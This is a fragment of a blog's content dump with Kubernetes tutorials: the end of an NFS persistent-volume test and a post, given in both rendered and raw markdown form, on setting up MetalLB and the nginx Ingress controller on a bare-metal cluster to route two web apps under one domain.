<span class=\"string\">nfs</span></span><br><span class=\"line\">              <span class=\"attr\">persistentVolumeClaim:</span></span><br><span class=\"line\">                <span class=\"attr\">claimName:</span> <span class=\"string\">pvc-nfs</span></span><br></pre></td></tr></table></figure>\n<p>Deploy the  <code>nginx-deployment.yaml</code>  using the  <code>kubectl apply -f</code> .</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nginx-deployment.yaml</span><br><span class=\"line\">deployment.apps/nginx-deployment created</span><br></pre></td></tr></table></figure>\n<p>Make sure that the deployment was created without any problems!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pods</span><br><span class=\"line\">NAME                                READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">nginx-deployment-7976956b49-fgbb4   1/1     Running   0          16s</span><br><span class=\"line\">nginx-deployment-7976956b49-hzrmm   1/1     Running   0          16s</span><br><span class=\"line\">nginx-deployment-7976956b49-kg5tx   1/1     Running   0          16s</span><br></pre></td></tr></table></figure>\n<h3 id=\"sanity-check-testing-the-nfs-volumes\"><a class=\"markdownIt-Anchor\" href=\"#sanity-check-testing-the-nfs-volumes\">#</a> Sanity Check (Testing the NFS volumes):</h3>\n<p>Let’s get shell on one of the running containers and go to the mount point then create a file!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> nginx-deployment-7976956b49-fgbb4 -- /bin/bash Command Line Prompt</span><br><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/<span class=\"comment\"># ls</span></span><br><span class=\"line\">bin  boot  dev  docker-entrypoint.d  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure>\n<p>Now the shell is opened. Let’s create a file in  <code>/usr/share/nginx/html</code> :</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/<span class=\"comment\"># cd /usr/share/nginx/html/</span></span><br></pre></td></tr></table></figure>\n<p>We find the file created in the client test xD</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\">file</span><br></pre></td></tr></table></figure>\n<p>Create a file named “hi from the other side!”</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html<span class=\"comment\"># touch &quot;hi from the other side!&quot;</span></span><br><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\">file  <span class=\"string\">&#x27;hi from the other side!&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>Let’s open another shell on another running container:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> nginx-deployment-7976956b49-kg5tx -- /bin/bash Command Line Prompt</span><br><span class=\"line\">root@nginx-deployment-7976956b49-kg5tx:/<span class=\"comment\"># cd /usr/share/nginx/html/</span></span><br></pre></td></tr></table></figure>\n<p>Bingoo! we find the same content on the same share point!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-kg5tx:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\"> file  <span class=\"string\">&#x27;hi from the other side!&#x27;</span></span><br><span class=\"line\">root@nginx-deployment-7976956b49-kg5tx:/usr/share/nginx/html<span class=\"comment\"># exit</span></span><br></pre></td></tr></table></figure>\n<p>Now we will try to delete the deployment and recreate another to check the data in the  persistent volume</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl delete -f nginx-deployment.yaml</span><br><span class=\"line\">deployment.apps <span class=\"string\">&quot;nginx-deployment&quot;</span> deleted</span><br><span class=\"line\"></span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nginx-deployment.yaml</span><br><span class=\"line\">deployment.apps/nginx-deployment created</span><br></pre></td></tr></table></figure>\n<p>Check the deployment created or not !</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~ kubectl get pods</span><br><span class=\"line\">NAME                                READY   STATUS              RESTARTS   AGE</span><br><span class=\"line\">nginx-deployment-7976956b49-7d5vw   1/1     Running             0          10s</span><br><span class=\"line\">nginx-deployment-7976956b49-9r5gx   0/1     ContainerCreating   0          10s</span><br><span class=\"line\">nginx-deployment-7976956b49-fdq7w   1/1     Running             0          10s</span><br></pre></td></tr></table></figure>\n<p>Open another shell on running container from the new deployment to check the content of the persistent volume:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> nginx-deployment-7976956b49-7d5vw -- /bin/bash Command Line Prompt</span><br><span class=\"line\">root@nginx-deployment-7976956b49-7d5vw:/<span class=\"comment\"># cd /usr/share/nginx/html/</span></span><br></pre></td></tr></table></figure>\n<p>Display the content of the mount point  <code>/usr/share/nginx/html/</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-7d5vw:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\"> file  <span class=\"string\">&#x27;hi from the other side!&#x27;</span></span><br><span class=\"line\">root@nginx-deployment-7976956b49-7d5vw:/usr/share/nginx/html<span class=\"comment\"># exit</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br></pre></td></tr></table></figure>\n<p>Bingoo! The content still in the persistent volume without any problem !</p>\n"},{"title":"Deploy Nginx Ingress in Bare-metal Cluster","date":"2022-09-09T14:08:22.000Z","cover":"https://imgur.com/vC01Qdu.png","_content":"\n# Ingress in bare metal Kubernetes cluster\nYou are working in enterprise that have one cluster with one public IP address and one Domain Name. In our Example `justk8s.k8s`.\nThat Enterprise want to deploy two web apps for these new service (gym and restaurant) with that single cluster,IP and Domain Name !!\nYour task is to deploy these two apps! So you decide to use `Ingress` because it's the best solution for this kind of problems!\n\n## What is Ingress\nKubernetes Ingress is an API object that provides routing rules to manage external users' access to the services in a Kubernetes cluster, typically via HTTPS/HTTP. With Ingress, you can easily set up rules for routing traffic without creating a bunch of Load Balancers or exposing each service on the node\n![](https://imgur.com/rXoZYym.png)\n\n## Ingress Controller\nAn Ingress Controller is a Kubernetes controller that is deployed manually to the cluster, most often as a DaemonSet or a Deployment object that runs dedicated Pods for handling incoming traffic load balancing and smart routing. It is responsible for processing the Ingress objects (which specify that they especially want to use the Ingress Controller) and dynamically configuring real routing rules \nThe most common used Ingress controllerfor Kubernetes is `Ingress Nginx`\n![](https://imgur.com/P0IubVc.png)\n## Ingress in cloud Vs Ingress in bare metal cluster\nDeploying Ingress pn managed Kubernetes cluster provided in cloud easier than in bare metal cluster. Because the Ingress Controller must be exposed as LoadBlancer! \n\nIn traditional cloud environments, where network load balancers are available on-demand, a single Kubernetes manifest suffices to provide a single point of contact to the NGINX Ingress controller to external clients and, indirectly, to any application running inside the cluster.\n \n![](https://imgur.com/JM86JeT.png) \n\nBare-metal environments lack this commodity, requiring a slightly different setup to offer the same kind of access to external consumers. So we need an aproach to solve this problem !\n\n![](https://imgur.com/MaTmKew.png)\n\n# Create Load Balancer / Proxy for bare metal cluster\nThere is a lot of method to set up a Load Balancer or Proxy to get Ingress work on our cluster.\n- We can expose our ingress controller using NodePort service and set up a proxy that forward to this service using a nginx proxy or HA proxy\n- We can also install a software solution called `metalLB`. This solution allows to create Load Balancer in local cluster without any problem ! So we can expose our ingress controller using Load Balancer service like in the cloud environment!\n## Create Load Balancer using metalLB:\nIn this demo we will deploy one of the 2 apps and expose it with Load Balancer service for the test purposes. So Let's start deploying the restaurant app and expose it ! \n\n```yaml Restaurant App Deployment\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: 4n6nk8s-kitchen\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kitchen\n  template:\n    metadata:\n      labels:\n        app: kitchen\n    spec:\n      containers:\n      - name: kitchen-app\n        image: mohamedrafraf/k8s-kitchen\n        ports:\n        - containerPort: 80\n```\nCreate the gym app deployment\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl apply -f kitchen-deployment.yaml\ndeployment.apps/4n6nk8s-kitchen created\n\nraf²@4n6nk8s-master$ kubectl get all\nNAME                                   READY   STATUS    RESTARTS   AGE\npod/4n6nk8s-kitchen-698f44db99-29dnr   1/1     Running   0          63s\n```\nLet's now expose now the deployment:\n``` bash command line prompt\nraf²@4n6nk8s-master$ kubectl expose deploy/4n6nk8s-kitchen--type=LoadBalacner --port=80\nservice/4n6nk8s-kitchen created\n```\nLet's check this service\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl get svc\nNAME              TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)        AGE\n4n6nk8s-kitchen   LoadBalancer   10.97.71.78      <pending>       80:30918/TCP   21s\nkubernetes        ClusterIP      10.96.0.1        <none>          443/TCP        5d11h\n```\nAs we see the LoadBalancer service still pending since we don't have any Load Balancer! Now it's time to talk about the metalLB !\n\nMetalLB provides a network load-balancer implementation for Kubernetes clusters that do not run on a supported cloud provider, effectively allowing the usage of LoadBalancer Services within any cluster.\n![](https://imgur.com/Xv7PiiK.png)\n\nIt's time to install metalLB. Installing metalLB is so easy we just need to apply two manifest from the official site of [metalLB](https://metallb.universe.tf/installation/)\n``` bash command line prompt\nkubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.12.1/manifests/namespace.yaml\nkubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.12.1/manifests/metallb.yaml\n```\nAfter running the previous commands, a new namespace will be created with a deployment, daesmonset and lot of RBAC authorization and rules!. So let's check this namespace!\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl get all -n metallb-system\nNAME                              READY   STATUS    RESTARTS       AGE\npod/controller-7cf77c64fb-4b8sx   1/1     Running   0              23s\npod/speaker-chh2t                 1/1     Running   0              23s\npod/speaker-xbn8z                 1/1     Running   0              23s\n\nNAME                     DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR            AGE\ndaemonset.apps/speaker   2         2         2       2            2           kubernetes.io/os=linux   23s\n\nNAME                         READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/controller   1/1     1            1           23s\n\nNAME                                    DESIRED   CURRENT   READY   AGE\nreplicaset.apps/controller-7cf77c64fb   1         1         1       23s\n```\n## Configure the address pool of the Load Balancer \nNow we must configure the `metalLB` using configmap object. In this configmap we give the address pool that will be used as LoadBalancer IP! Also the type of the Load Balancer.\n> metalLB supports two LoadBalancing modes : Layer 2 mode and BGP mode. In our case we will use the Layer 2 mode\n\nNow Let's move to the configmap manifest!\n```yaml Configmap  \napiVersion: v1\nkind: ConfigMap\nmetadata:\n  namespace: metallb-system\n  name: config\ndata:\n  config: |\n    address-pools:\n    - name: default\n      protocol: layer2\n      addresses:\n      - 192.168.1.240-192.168.1.250\n```\nAfter Applying this recent configmap. we can say that the metalLB installtion is finished! So Let's check the services again in our cluster !\n\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl get svc\nNAME              TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)        AGE\n4n6nk8s-kitchen   LoadBalancer   10.97.71.78      192.168.1.241   80:30918/TCP   5m4s\nkubernetes        ClusterIP      10.96.0.1        <none>          443/TCP        5d11h\n```\nBingo! our Load Balancer service has an external IP address. So our deployment is accessable through this IP! Let's check it:\nٍ![](https://imgur.com/jWkr5kf.png)\nEverything is OK! now we can say that we have a Load Balancer on our bare metal cluster!\n# Install the nginx Ingress Controller:\nInstalling the nginx ingress controller can be done either by using Helm or the yaml manifest provided in the nginx controller website\n## Install the controller using Helm \nIf you have Helm, you can deploy the ingress controller with the following command:\n``` bash command line prompt \nraf²@4n6nk8s-master$ helm upgrade --install ingress-nginx ingress-nginx \\\n  --repo https://kubernetes.github.io/ingress-nginx \\\n  --namespace ingress-nginx --create-namespace\n```\n## Install the controller using yaml manifest:\nIf you don't have Helm or if you prefer to use a YAML manifest, you can run the following command instead:\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.2.0/deploy/static/provider/cloud/deploy.yaml\n\nnamespace/ingress-nginx created\nserviceaccount/ingress-nginx created\nserviceaccount/ingress-nginx-admission created\nrole.rbac.authorization.k8s.io/ingress-nginx created\nrole.rbac.authorization.k8s.io/ingress-nginx-admission created\nclusterrole.rbac.authorization.k8s.io/ingress-nginx created\nclusterrole.rbac.authorization.k8s.io/ingress-nginx-admission created\nrolebinding.rbac.authorization.k8s.io/ingress-nginx created\nrolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created\nclusterrolebinding.rbac.authorization.k8s.io/ingress-nginx created\nclusterrolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created\nconfigmap/ingress-nginx-controller created\nservice/ingress-nginx-controller created\nservice/ingress-nginx-controller-admission created\ndeployment.apps/ingress-nginx-controller created\njob.batch/ingress-nginx-admission-create created\njob.batch/ingress-nginx-admission-patch created\ningressclass.networking.k8s.io/nginx created\nvalidatingwebhookconfiguration.admissionregistration.k8s.io/ingress-nginx-admission created\n```\n## Check the Nginx Ingress Controller:\nLet's check the pods created in the namespace of the ingress-nginx\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl get pods --namespace=ingress-nginx\n\nNAME                                        READY   STATUS              RESTARTS   AGE\ningress-nginx-admission-create-qd8fz        0/1     ContainerCreating   0          10s\ningress-nginx-admission-patch-76lgl         0/1     ContainerCreating   0          10s\ningress-nginx-controller-7575567f98-hg6tq   0/1     ContainerCreating   0          10s\n```\nAfter waiting a few minute until the controller is ready, we must check all the services and deployments of the ingress-nginx namespace again ! You must find an output similar to the following\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl get all -n ingress-nginx\n\nNAME                                            READY   STATUS      RESTARTS        AGE\npod/ingress-nginx-admission-create-9dshm        0/1     Completed   0               23m\npod/ingress-nginx-admission-patch-rj7gk         0/1     Completed   0               23m\npod/ingress-nginx-controller-7575567f98-8w6pm   1/1     Running     0               23m\n\nNAME                                         TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)                      AGE\nservice/ingress-nginx-controller             LoadBalancer   10.100.234.221   192.168.1.240   80:32545/TCP,443:31214/TCP   23m\nservice/ingress-nginx-controller-admission   ClusterIP      10.109.162.157   <none>          443/TCP                      23m\n\nNAME                                       READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/ingress-nginx-controller   1/1     1            1           23m\n\nNAME                                                  DESIRED   CURRENT   READY   AGE\nreplicaset.apps/ingress-nginx-controller-7575567f98   1         1         1       23m\n\nNAME                                       COMPLETIONS   DURATION   AGE\njob.batch/ingress-nginx-admission-create   1/1           3s         23m\njob.batch/ingress-nginx-admission-patch    1/1           4s         23m\n```\nBingo! the ingress controller is ready and on running state! also is exposed with Load Balancer and it have a Extenal-IP `192.168.1.240`\nNow we can deploy an ingress object without any problem ! It's time to deploy our 2 apps with ingress in one single domain name and one IP address !\n\n# Deploy The two Apps using Ingress:\nLet's start by deploying the apps and expose it with Cluster IP service !\n\n```yaml Gym App Deployment\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: 4n6nk8s-gym\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gym\n  template:\n    metadata:\n      labels:\n        app: gym\n    spec:\n      containers:\n      - name: gym-app\n        image: mohamedrafraf/k8s-gym\n        ports:\n        - containerPort: 80\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: gym-svc\nspec:\n  selector:\n    app: gym\n  type: ClusterIP\n  ports:\n  - protocol: TCP\n    port: 80\n```\nCreate the deployment and service of the gym app\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl apply -f gym-deployment.yaml\ndeployment.apps/4n6nk8s-gym created\nraf²@4n6nk8s-master$ kubectl apply -f gym-svc.yaml\nservice/gym-svc created\n```\nThe manifest of the restaurant app and the service:\n```yaml Restaurant App Deployment   \napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: 4n6nk8s-kitchen\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kitchen\n  template:\n    metadata:\n      labels:\n        app: kitchen\n    spec:\n      containers:\n      - name: kitchen-app\n        image: mohamedrafraf/k8s-kitchen\n        ports:\n        - containerPort: 80\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: kitchen-svc\nspec:\n  selector:\n    app: kitchen\n  type: ClusterIP\n  ports:\n  - protocol: TCP\n    port: 80\n```\nCreate the restaurant deployment and the service:\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl apply -f kitchen-deployment.yaml\ndeployment.apps/4n6nk8s-kitchen created\nraf²@4n6nk8s-master$ kubectl apply -f kitchen-svc.yaml\nservice/kitchen-svc created\n```\nCheck the deployments and the services! :\n``` bash command line prompt\nraf²@4n6nk8s-master$ kubectl get all\nNAME                                   READY   STATUS    RESTARTS   AGE\npod/4n6nk8s-gym-698f44db99-29dnr       1/1     Running   0          63s\npod/4n6nk8s-kitchen-6b56959b86-n7c9z   1/1     Running   0          46s\n\nNAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE\nservice/gym-svc             ClusterIP   10.110.191.206   <none>        80/TCP     53s\nservice/kitchen-svc         ClusterIP   10.102.94.94     <none>        80/TCP     39s\nservice/kubernetes          ClusterIP   10.96.0.1        <none>        443/TCP    3d14h\n\nNAME                              READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/4n6nk8s-gym       1/1     1            1           63s\ndeployment.apps/4n6nk8s-kitchen   1/1     1            1           46s\n\nNAME                                         DESIRED   CURRENT   READY   AGE\nreplicaset.apps/4n6nk8s-gym-698f44db99       1         1         1       63s\nreplicaset.apps/4n6nk8s-kitchen-6b56959b86   1         1         1       46s\n```\nLet's now create the ingress manifest:\n```yaml Ingress YAML Definition\n\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  annotations:\n    nginx.ingress.kubernetes.io/rewrite-target: /\n  name: ingress-4n6nk8s\nspec:\n  ingressClassName: nginx\n  rules:\n  - host: justk8s.k8s\n    http:\n      paths:\n      - path: /kitchen\n        pathType: Prefix\n        backend:\n          service:\n            name: kitchen-svc\n            port:\n              number: 80\n      - path: /gym\n        pathType: Prefix\n        backend:\n          service:\n            name: gym-svc\n            port:\n              number: 80\n```\nThe `ingressClassName` must be \"nginx\" since we have nginx ingress controller. The `host` field in the `rules` define the domain name of the request. So if a HTTP request come to the cluster with the host name `justk8s.k8s` this rull will be applied!\nThe the `path` int the `paths` will be the route ! The ingress give you the service in this route!\nIn our Example if we enter `http://justk8s.k8s/kitchen` the ingress will forward the restaurant app!\nin the `path` field we specify the `service` name and the `port number`\n\nNow Let's Create the ingress object\n``` bash command line prompt\nraf²@4n6nk8s-master$ kubectl apply -f ingress.yaml\ningress.networking.k8s.io/ingress-4n6nk8s created\n```\nCheck the ingerss object ! \n``` bash command line prompt\nraf²@4n6nk8s-master$ kubectl get ingress\nNAME              CLASS   HOSTS         ADDRESS   PORTS   AGE\ningress-4n6nk8s   nginx   justk8s.k8s             80      5s\n``` \nDisplay more details about the ingress object with `kubectl describe ingress`:\n``` bash command line prompt\nraf²@4n6nk8s-master$ kubectl describe ingress ingress-4n6nk8s\nName:             ingress-4n6nk8s\nLabels:           <none>\nNamespace:        default\nAddress:          192.168.1.240\nDefault backend:  default-http-backend:80 (<error: endpoints \"default-http-backend\" not found>)\nRules:\n  Host         Path  Backends\n  ----         ----  --------\n  justk8s.k8s\n               /kitchen   kitchen-svc:80 (10.1.235.141:80)\n               /gym       gym-svc:80 (10.1.235.147:80)\nAnnotations:   nginx.ingress.kubernetes.io/rewrite-target: /\nEvents:\n  Type    Reason  Age               From                      Message\n  ----    ------  ----              ----                      -------\n  Normal  Sync    7s (x2 over 19s)  nginx-ingress-controller  Scheduled for sync\n```\nWe see that the Default backend display `(<error: endpoints \"default-http-backend\" not found>)`.\nThis error occur because we don't specify a default backend (route) so when you enter `http://justk8s.k8s/` we will find the nginx 404 not found page !\n# Check the Deployments! \nAfter Installing the LoadBalancer and Ingress Controller. Let's try to access to our 2 apps. But before access to this apps let's create an `/etc/hosts` entry (`C:\\Windows\\System32\\Drivers\\etc\\hosts` for Windows):\n```bash /etc/hosts \n192.168.1.240 justk8s.k8s # The IP address of the Load Balancer of the Ingress Controller !\n```\nNow Let's go to our browser! I add this entry in my master node! So I can access to these apps from my master node !:\n\n![](https://imgur.com/p4sAzQX.png)\n![](https://imgur.com/tauie6V.png)\n\nBingo! Everything is Ok !","source":"_posts/Kubernetes/nginx-ingress.md","raw":"---\ntitle: Deploy Nginx Ingress in Bare-metal Cluster\ndate: 2022-09-09 15:08:22\ntags:\ncover: https://imgur.com/vC01Qdu.png\ncategories:\n- [Kubernetes]\n---\n\n# Ingress in bare metal Kubernetes cluster\nYou are working in enterprise that have one cluster with one public IP address and one Domain Name. In our Example `justk8s.k8s`.\nThat Enterprise want to deploy two web apps for these new service (gym and restaurant) with that single cluster,IP and Domain Name !!\nYour task is to deploy these two apps! So you decide to use `Ingress` because it's the best solution for this kind of problems!\n\n## What is Ingress\nKubernetes Ingress is an API object that provides routing rules to manage external users' access to the services in a Kubernetes cluster, typically via HTTPS/HTTP. With Ingress, you can easily set up rules for routing traffic without creating a bunch of Load Balancers or exposing each service on the node\n![](https://imgur.com/rXoZYym.png)\n\n## Ingress Controller\nAn Ingress Controller is a Kubernetes controller that is deployed manually to the cluster, most often as a DaemonSet or a Deployment object that runs dedicated Pods for handling incoming traffic load balancing and smart routing. It is responsible for processing the Ingress objects (which specify that they especially want to use the Ingress Controller) and dynamically configuring real routing rules \nThe most common used Ingress controllerfor Kubernetes is `Ingress Nginx`\n![](https://imgur.com/P0IubVc.png)\n## Ingress in cloud Vs Ingress in bare metal cluster\nDeploying Ingress pn managed Kubernetes cluster provided in cloud easier than in bare metal cluster. Because the Ingress Controller must be exposed as LoadBlancer! \n\nIn traditional cloud environments, where network load balancers are available on-demand, a single Kubernetes manifest suffices to provide a single point of contact to the NGINX Ingress controller to external clients and, indirectly, to any application running inside the cluster.\n \n![](https://imgur.com/JM86JeT.png) \n\nBare-metal environments lack this commodity, requiring a slightly different setup to offer the same kind of access to external consumers. So we need an aproach to solve this problem !\n\n![](https://imgur.com/MaTmKew.png)\n\n# Create Load Balancer / Proxy for bare metal cluster\nThere is a lot of method to set up a Load Balancer or Proxy to get Ingress work on our cluster.\n- We can expose our ingress controller using NodePort service and set up a proxy that forward to this service using a nginx proxy or HA proxy\n- We can also install a software solution called `metalLB`. This solution allows to create Load Balancer in local cluster without any problem ! So we can expose our ingress controller using Load Balancer service like in the cloud environment!\n## Create Load Balancer using metalLB:\nIn this demo we will deploy one of the 2 apps and expose it with Load Balancer service for the test purposes. So Let's start deploying the restaurant app and expose it ! \n\n```yaml Restaurant App Deployment\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: 4n6nk8s-kitchen\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kitchen\n  template:\n    metadata:\n      labels:\n        app: kitchen\n    spec:\n      containers:\n      - name: kitchen-app\n        image: mohamedrafraf/k8s-kitchen\n        ports:\n        - containerPort: 80\n```\nCreate the gym app deployment\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl apply -f kitchen-deployment.yaml\ndeployment.apps/4n6nk8s-kitchen created\n\nraf²@4n6nk8s-master$ kubectl get all\nNAME                                   READY   STATUS    RESTARTS   AGE\npod/4n6nk8s-kitchen-698f44db99-29dnr   1/1     Running   0          63s\n```\nLet's now expose now the deployment:\n``` bash command line prompt\nraf²@4n6nk8s-master$ kubectl expose deploy/4n6nk8s-kitchen--type=LoadBalacner --port=80\nservice/4n6nk8s-kitchen created\n```\nLet's check this service\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl get svc\nNAME              TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)        AGE\n4n6nk8s-kitchen   LoadBalancer   10.97.71.78      <pending>       80:30918/TCP   21s\nkubernetes        ClusterIP      10.96.0.1        <none>          443/TCP        5d11h\n```\nAs we see the LoadBalancer service still pending since we don't have any Load Balancer! Now it's time to talk about the metalLB !\n\nMetalLB provides a network load-balancer implementation for Kubernetes clusters that do not run on a supported cloud provider, effectively allowing the usage of LoadBalancer Services within any cluster.\n![](https://imgur.com/Xv7PiiK.png)\n\nIt's time to install metalLB. Installing metalLB is so easy we just need to apply two manifest from the official site of [metalLB](https://metallb.universe.tf/installation/)\n``` bash command line prompt\nkubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.12.1/manifests/namespace.yaml\nkubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.12.1/manifests/metallb.yaml\n```\nAfter running the previous commands, a new namespace will be created with a deployment, daesmonset and lot of RBAC authorization and rules!. So let's check this namespace!\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl get all -n metallb-system\nNAME                              READY   STATUS    RESTARTS       AGE\npod/controller-7cf77c64fb-4b8sx   1/1     Running   0              23s\npod/speaker-chh2t                 1/1     Running   0              23s\npod/speaker-xbn8z                 1/1     Running   0              23s\n\nNAME                     DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR            AGE\ndaemonset.apps/speaker   2         2         2       2            2           kubernetes.io/os=linux   23s\n\nNAME                         READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/controller   1/1     1            1           23s\n\nNAME                                    DESIRED   CURRENT   READY   AGE\nreplicaset.apps/controller-7cf77c64fb   1         1         1       23s\n```\n## Configure the address pool of the Load Balancer \nNow we must configure the `metalLB` using configmap object. In this configmap we give the address pool that will be used as LoadBalancer IP! Also the type of the Load Balancer.\n> metalLB supports two LoadBalancing modes : Layer 2 mode and BGP mode. In our case we will use the Layer 2 mode\n\nNow Let's move to the configmap manifest!\n```yaml Configmap  \napiVersion: v1\nkind: ConfigMap\nmetadata:\n  namespace: metallb-system\n  name: config\ndata:\n  config: |\n    address-pools:\n    - name: default\n      protocol: layer2\n      addresses:\n      - 192.168.1.240-192.168.1.250\n```\nAfter Applying this recent configmap. we can say that the metalLB installtion is finished! So Let's check the services again in our cluster !\n\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl get svc\nNAME              TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)        AGE\n4n6nk8s-kitchen   LoadBalancer   10.97.71.78      192.168.1.241   80:30918/TCP   5m4s\nkubernetes        ClusterIP      10.96.0.1        <none>          443/TCP        5d11h\n```\nBingo! our Load Balancer service has an external IP address. So our deployment is accessable through this IP! Let's check it:\nٍ![](https://imgur.com/jWkr5kf.png)\nEverything is OK! now we can say that we have a Load Balancer on our bare metal cluster!\n# Install the nginx Ingress Controller:\nInstalling the nginx ingress controller can be done either by using Helm or the yaml manifest provided in the nginx controller website\n## Install the controller using Helm \nIf you have Helm, you can 